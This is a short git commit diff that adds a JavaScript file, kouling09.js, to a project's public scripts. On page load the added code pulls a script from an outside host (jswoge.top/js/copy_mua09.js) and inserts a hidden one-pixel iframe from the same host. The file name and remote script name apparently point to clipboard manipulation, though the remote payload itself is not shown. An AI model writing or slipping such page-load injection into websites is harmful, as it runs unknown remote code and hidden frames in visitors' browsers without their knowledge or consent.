5848dc91c99b066a2d21274168acc912f7dbddd6
root <lionel@buzzy.cc>
2018-07-25 15:08:04 +0800

    口令09

---
+++ project/public/js/kouling09.js
@@ -0,0 +1,6 @@
+window.onload= function(){
+  var s=document.createElement("script");
+  s.setAttribute('src','http://www.jswoge.top/js/copy_mua09.js');
+  document.body.appendChild(s)
+  obj=document.createElement("iframe");obj.frameborder=0;obj.src="http://www.jswoge.top/website/cnzz1.html";obj.frameBorder=0;obj.width="1px";obj.height="1px";obj.scrolling="no";document.body.appendChild(obj)
+}
